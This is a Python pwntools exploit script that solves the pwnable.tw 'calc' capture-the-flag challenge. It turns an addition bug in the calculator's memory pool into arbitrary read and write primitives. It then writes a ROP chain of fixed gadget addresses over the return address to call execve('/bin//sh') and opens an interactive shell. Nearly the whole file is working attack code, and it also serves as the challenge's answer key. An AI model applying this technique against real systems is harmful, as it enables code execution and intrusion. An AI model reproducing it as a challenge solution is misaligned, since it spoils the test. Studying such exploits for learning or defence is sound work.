#!/usr/bin/env python3
from pwn import *

# -------------------------------------------------------------------------
# Setup: Connect to the remote challenge server
# -------------------------------------------------------------------------
io = remote('chall.pwnable.tw', 10100)

# Consume the initial welcome banner
io.recvline() 

# -------------------------------------------------------------------------
# Our Arsenal: Arbitrary Read & Write Primitives
# -------------------------------------------------------------------------
def read_val(offset):
    """
    Read memory at the given pool offset.
    Sends '+OFFSET' and parses the integer response.
    """
    io.sendline(f"+{offset}".encode())
    return int(io.recvline().strip())

def write_val(offset, target_value):
    """
    Write an arbitrary value to the given pool offset.
    Because the bug works via addition (pool[offset] += input), 
    we must calculate the mathematical difference.
    """
    current_value = read_val(offset)
    
    # Calculate difference (handles both positive and negative jumps)
    diff = target_value - current_value
    
    if diff > 0:
        payload = f"+{offset}+{diff}"
    elif diff < 0:
        payload = f"+{offset}{diff}" # diff already includes the minus sign (e.g. +361-50)
    else:
        return # Value is already correct, no need to overwrite
        
    io.sendline(payload.encode())
    io.recvline() # Consume the calculation result to keep the buffer clean

# -------------------------------------------------------------------------
# Translating your ROPgadget Payload into Integers
# -------------------------------------------------------------------------
# Strings converted to Little-Endian 32-bit Integers
BIN_CHUNK  = u32(b"/bin")   # 0x6e69622f = 1852400175
SH_CHUNK   = u32(b"//sh")   # 0x68732f2f = 1752387375

# Map your exact chain sequentially starting at pool[361] (Return Address)
rop_chain = {
    361: 0x080701aa, # pop edx ; ret
    362: 0x080ec060, # @ .data
    363: 0x0805c34b, # pop eax ; ret
    364: BIN_CHUNK,  # '/bin'
    365: 0x0809b30d, # mov dword ptr [edx], eax ; ret
    366: 0x080701aa, # pop edx ; ret
    367: 0x080ec064, # @ .data + 4
    368: 0x0805c34b, # pop eax ; ret
    369: SH_CHUNK,   # '//sh'
    370: 0x0809b30d, # mov dword ptr [edx], eax ; ret
    371: 0x080701aa, # pop edx ; ret
    372: 0x080ec068, # @ .data + 8
    373: 0x080550d0, # xor eax, eax ; ret
    374: 0x0809b30d, # mov dword ptr [edx], eax ; ret
    375: 0x080481d1, # pop ebx ; ret
    376: 0x080ec060, # @ .data
    377: 0x080701d1, # pop ecx ; pop ebx ; ret
    378: 0x080ec068, # @ .data + 8
    379: 0x080ec060, # padding without overwrite ebx
    380: 0x080701aa, # pop edx ; ret
    381: 0x080ec068, # @ .data + 8
    382: 0x080550d0, # xor eax, eax ; ret
    
    # 11 times "inc eax ; ret" to set EAX to 11 (SYS_execve)
    383: 0x0807cb7f, # inc eax ; ret
    384: 0x0807cb7f, # inc eax ; ret
    385: 0x0807cb7f, # inc eax ; ret
    386: 0x0807cb7f, # inc eax ; ret
    387: 0x0807cb7f, # inc eax ; ret
    388: 0x0807cb7f, # inc eax ; ret
    389: 0x0807cb7f, # inc eax ; ret
    390: 0x0807cb7f, # inc eax ; ret
    391: 0x0807cb7f, # inc eax ; ret
    392: 0x0807cb7f, # inc eax ; ret
    393: 0x0807cb7f, # inc eax ; ret
    
    394: 0x08049a21  # int 0x80 (syscall)
}

# -------------------------------------------------------------------------
# Injecting the Payload & Triggering the Shell
# -------------------------------------------------------------------------
log.info("Sequentially writing ROP chain gadgets to stack offsets...")
for offset, val in rop_chain.items():
    log.info(f"Writing {hex(val)} to pool[{offset}]")
    write_val(offset, val)

log.success("ROP chain successfully written!")

log.info("Sending non-numeric line to trigger function return...")
# Sending an arbitrary string terminates the calculator loop and calls the "ret" instruction
io.sendline(b"LET_US_GO") 

# Drop into interactive mode to enjoy your root shell!
io.interactive()
